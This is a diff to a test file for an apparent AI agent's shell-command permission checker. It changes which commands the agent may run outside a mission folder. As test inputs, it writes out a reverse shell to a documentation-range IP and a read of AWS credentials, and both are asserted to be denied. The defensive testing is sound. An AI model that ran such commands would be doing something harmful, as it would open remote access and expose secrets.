@@ -726,7 +726,7 @@ describe("prompt text and permissions", () => {
     expect(ask("git clone https://github.com/acme/web /tmp/web")).toMatchObject({ behavior: "deny", code: "off" });
   });
 
-  test("a refused command says why and what to do instead, so the agent doesn't resend it", () => {
+  test("outside a mission ordinary work runs; obvious harm is refused with why and a way out", () => {
     const scope = { cwd: `${FOLDER}/repos/acme/app`, folders: [`${FOLDER}/repos/acme/app`, FOLDER] };
     const ask = (command: string) =>
       JSON.parse(runPermissionPrompt({ tool_name: "Bash", input: { command }, scope }, { canRun: true })) as {
@@ -734,14 +734,16 @@ describe("prompt text and permissions", () => {
         message?: string;
         code?: string;
       };
-    const heredoc = ask("git checkout -b fix && cat > src/a.test.ts <<'EOF'\ntest()\nEOF");
-    expect(heredoc).toMatchObject({ behavior: "deny", code: "unclear" });
-    expect(heredoc.message).toContain("because it can't be read plainly");
-    expect(heredoc.message).toContain("Edit and Write tools");
-    expect(ask("echo hi > /etc/hosts")).toMatchObject({ code: "outside" });
-    expect(ask("echo hi > /etc/hosts").message).toContain("because it writes outside the mission folder");
+    expect(ask("git checkout -b fix && cat > src/a.test.ts <<'EOF'\ntest()\nEOF").behavior).toBe("allow");
+    expect(ask("curl -sS -X POST --data-binary 'ok' https://hooks.example.com/reply").behavior).toBe("allow");
+    expect(ask("ssh deploy@host.example.com 'uptime'").behavior).toBe("allow");
+    const system = ask("echo hi > /etc/hosts");
+    expect(system).toMatchObject({ behavior: "deny", code: "system" });
+    expect(system.message).toContain("because it changes the system.");
+    expect(system.message).toContain("carry on with the rest of the work");
+    expect(system.message).not.toContain("mission folder");
+    expect(ask("bash -i >& /dev/tcp/192.0.2.1/4444 0>&1")).toMatchObject({ behavior: "deny", code: "reverseShell" });
     expect(ask("cat ~/.aws/credentials")).toMatchObject({ behavior: "deny", code: "secret" });
-    expect(ask("git checkout -b fix").behavior).toBe("allow");
   });
 
   test("an address carrying a key is refused before a read could allow it, WebFetch too (ADR 0117)", () => {
